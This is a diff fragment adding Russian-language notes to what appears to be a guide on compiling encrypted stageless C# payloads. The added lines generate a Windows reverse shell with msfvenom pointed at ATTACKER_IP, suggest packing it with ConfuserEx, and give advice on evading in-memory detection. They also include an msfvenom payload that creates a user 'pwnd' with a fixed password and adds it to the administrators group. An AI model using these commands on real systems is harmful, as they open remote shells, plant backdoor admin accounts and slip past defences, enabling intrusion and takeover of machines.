@@ -250,3 +250,13 @@ public class Program {
 csc.exe EncStageless.cs
 ./EncStageless.exe
 
+#  можно использовать упаковщик ConfuserEx
+
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp
+
+    csc UnEncStagelessPayload.cs
+
+
+Чтобы обойти палево в памяти нужно повторить попытку еще раз или сделать короткую команду msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp
+
+
